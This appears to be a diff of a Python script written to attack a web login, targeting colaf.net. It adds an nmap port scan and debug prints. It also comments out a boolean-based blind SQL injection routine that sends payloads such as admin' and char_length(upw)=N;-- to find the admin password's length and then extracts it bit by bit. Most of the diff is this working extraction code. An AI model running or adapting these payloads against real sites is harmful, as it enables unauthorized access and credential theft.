@@ -2,9 +2,10 @@ import requests
 import re
 import string, json
 import nmap
+import socket
 
-host = 'http://colaf.net'
-port = '443'
+host = 'colaf.net'
+port = '80'
 url = host+':'+port
 headers = {'Content-Type': 'application/json; charset=utf-8'}
 cookies = {
@@ -68,11 +69,16 @@ def printLog(payload, responseText):
 nmap_scan = nmap.PortScanner()
 ip_regex = re.compile("^\d")
 try:
+    print(str(host.replace(" ", "")))
     isValidIp = ip_regex.search(host.replace(" ", ""))
+    print(str(isValidIp))
     if isValidIp:
+        print("ifif")
         IP = host
     else:
+        print("elseelse")
         IP = socket.gethostbyname(host)
+        print(str(IP))
 except:
     print("잘못된 host name 입니다.")
 
@@ -100,39 +106,39 @@ def existDetector(text):
     regex_exist = re.compile('exists')
     detectedTexts = regex_exist.findall(text)
     return detectedTexts
-pwLength = 0
-for index in range(50):
-    payload = 'admin\' and char_length(upw)='+str(index)+';--'
-    params = {
-        'uid': payload}
-    response = requests.get(url, params = params, verify=False)
-    printLog(payload, refineResponse(response.text))
-    if len(existDetector(response.text))>0:
-        pwLength = index
-        break
-countPw = []
-binaryPw = []
-for nthPw in range(1, pwLength+1):
-    for nthBit in range(128):
-        payload = 'admin\' and length(bin(ord(substr(upw, '+str(nthPw)+', 1))))='+str(nthBit)+';--'
-        params = {'uid': payload}
-        response = requests.get(url, params = params, verify=False)
-        #printLog('nthPw: '+str(nthPw)+', nthBit: '+str(nthbit), refineResponse(response.text))
-        if len(existDetector(response.text))>0:
-            bitarray = []
-            print(str(nthPw)+'th password: '+str(nthBit))
-            for bit in range(1, nthBit+1):
-                payload = 'admin\' and substr(bin(ord(substr(upw, '+str(nthPw)+', 1))), '+str(bit)+', 1)=0;--'
-                params = {'uid': payload}
-                response = requests.get(url, params = params, verify=False)
-                if len(existDetector(response.text))>0:
-                    bitarray += '0'
-                else:
-                    bitarray += '1'
-                print(bitarray)
-            binaryPw += bitarray
-            break
-3
+#pwLength = 0
+#for index in range(50):
+#    payload = 'admin\' and char_length(upw)='+str(index)+';--'
+#    params = {
+#        'uid': payload}
+#    response = requests.get(url, params = params, verify=False)
+#    printLog(payload, refineResponse(response.text))
+#    if len(existDetector(response.text))>0:
+#        pwLength = index
+#        break
+#countPw = []
+#binaryPw = []
+#for nthPw in range(1, pwLength+1):
+#    for nthBit in range(128):
+#        payload = 'admin\' and length(bin(ord(substr(upw, '+str(nthPw)+', 1))))='+str(nthBit)+';--'
+#        params = {'uid': payload}
+#        response = requests.get(url, params = params, verify=False)
+#        #printLog('nthPw: '+str(nthPw)+', nthBit: '+str(nthbit), refineResponse(response.text))
+#        if len(existDetector(response.text))>0:
+#            bitarray = []
+#            print(str(nthPw)+'th password: '+str(nthBit))
+#            for bit in range(1, nthBit+1):
+#                payload = 'admin\' and substr(bin(ord(substr(upw, '+str(nthPw)+', 1))), '+str(bit)+', 1)=0;--'
+#                params = {'uid': payload}
+#                response = requests.get(url, params = params, verify=False)
+#                if len(existDetector(response.text))>0:
+#                    bitarray += '0'
+#                else:
+#                    bitarray += '1'
+#                print(bitarray)
+#            binaryPw += bitarray
+#            break
+#
 ################################ PALETTE ################################
 
 # response = requests.get(url, params = params, cookies=cookies, verify=False)
